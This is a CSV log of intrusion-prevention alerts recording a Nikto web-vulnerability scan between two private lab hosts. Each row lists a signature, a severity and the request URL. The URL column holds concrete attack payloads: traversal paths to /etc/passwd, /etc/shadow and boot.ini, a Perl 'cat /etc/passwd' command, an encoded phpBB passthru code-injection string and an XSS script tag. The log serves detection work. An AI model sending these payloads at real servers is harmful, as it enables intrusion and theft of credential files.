attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
44780,7205,52,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,
10574,7205,7,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50924,80,ips,signature,
44780,7206,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/cgi-bin/webdist.cgi
12577,7206,1,critical,Cisco.Command.Execution,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/exec/show/config/cr
43336,7206,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/perl/-e%20%22system('cat%20/etc/passwd');\\%22
10574,7206,1,medium,HTTP.URI.Script.XSS,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,/<script>alert('Vulnerable')</script>
44780,7206,102,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50926,80,ips,signature,
44780,7207,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,/_vti_bin/_vti_aut/fp30reg.dll?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
44780,7207,45,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50928,80,ips,signature,
44780,7208,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,/level/16/exec/-///pwd
43336,7208,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu
44780,7208,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50930,80,ips,signature,
44780,7209,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/examples/jsp/snp/snoop.jsp
34971,7209,1,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/index.php?err=3&email=\\\
15463,7209,1,high,PHP.URI.Code.Injection,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
10181,7209,1,high,phpBB.Viewtopic.Highlight.Remote.Code.Execution,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
43336,7209,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,/cgi-bin/pfdisplay.cgi?../../../../../../etc/passwd
44780,7209,23,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,
34971,7209,5,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,
15463,7209,52,high,PHP.URI.Code.Injection,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,
10181,7209,13,high,phpBB.Viewtopic.Highlight.Remote.Code.Execution,HTTP,172.16.1.2,172.16.2.2,50932,80,ips,signature,
44780,7210,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/
12758,7210,1,low,MS.IIS.IndexServer.Disclosure,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full
30908,7210,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini
43336,7210,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd
44780,7210,48,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50934,80,ips,signature,
44780,7211,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50936,80,ips,signature,/../../../../../../../../../etc/passw*
44780,7212,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/bytehoard/index.php?infolder=../../../../../../../../../../../etc/
30908,7212,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/OpenFile.aspx?file=../../../../../../../../../../boot.ini
34971,7212,1,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/index.php?vo=\\\
43336,7212,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,/.../.../.../.../.../.../.../.../.../.../etc/passwd
44780,7212,5,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50938,80,ips,signature,
12709,7213,1,low,MS.IIS.IISadmpwd.HTR.File.Access.Security.Bypass,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,/iisadmpwd/aexp2.htr
44780,7213,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,//admin/aindex.htm
12709,7213,4,low,MS.IIS.IISadmpwd.HTR.File.Access.Security.Bypass,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,
44780,7213,2,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50940,80,ips,signature,
44780,7214,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50942,80,ips,signature,/admin/wg_user-info.ml
44780,7214,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50942,80,ips,signature,
44780,7215,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50944,80,ips,signature,/console
44780,7215,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50944,80,ips,signature,
44780,7216,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50946,80,ips,signature,/logfile.htm
44780,7216,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50946,80,ips,signature,
44780,7217,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50948,80,ips,signature,/restricted/
44780,7217,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50948,80,ips,signature,
44780,7218,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50950,80,ips,signature,/WebShop/logs/cc.txt
43336,7218,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50950,80,ips,signature,/etc/passwd
44780,7218,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50950,80,ips,signature,
44780,7219,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50952,80,ips,signature,/decsdoc.nsf
44780,7219,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50952,80,ips,signature,
44780,7220,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,/stsrc.nsf
43336,7220,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,/etc/shadow+
44780,7220,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50954,80,ips,signature,
44780,7221,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd
43336,7221,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra.asp?n=../../../../../../../../../etc/passwd
30908,7221,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra.asp?n=/../../../../../../../../../../../boot.ini
24975,7221,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,/forum-ra_professionnel.asp?n=../../boot.ini
44780,7221,4,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,
43336,7221,10,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,
30908,7221,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,
24975,7221,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50956,80,ips,signature,
43336,7222,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50958,80,ips,signature,/forum.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7223,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50960,80,ips,signature,/forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7224,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50962,80,ips,signature,/forum.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7225,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50964,80,ips,signature,/forum.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7226,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50966,80,ips,signature,/forum.asp?n=/../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7227,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50968,80,ips,signature,/forum.asp?n=/../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7228,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50970,80,ips,signature,/forum.asp?n=/.\\\
43336,7229,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50972,80,ips,signature,/forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7230,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50974,80,ips,signature,/forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7231,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50976,80,ips,signature,/forum.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
44780,7232,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum/mainfile.php
43336,7232,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
24975,7232,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1.asp?n=1753&amp;nn=/....../boot.ini
30908,7232,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,/forum1.asp?n=1753&amp;nn=/../../../../../../../../../../../../../../../../../../../../boot.ini
44780,7232,27,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,
43336,7232,26,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,
24975,7232,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,
30908,7232,4,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,50978,80,ips,signature,
43336,7233,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50980,80,ips,signature,/forum_arc.asp?n=../../../../../../../../../etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7234,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50982,80,ips,signature,/forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7235,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50984,80,ips,signature,/forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
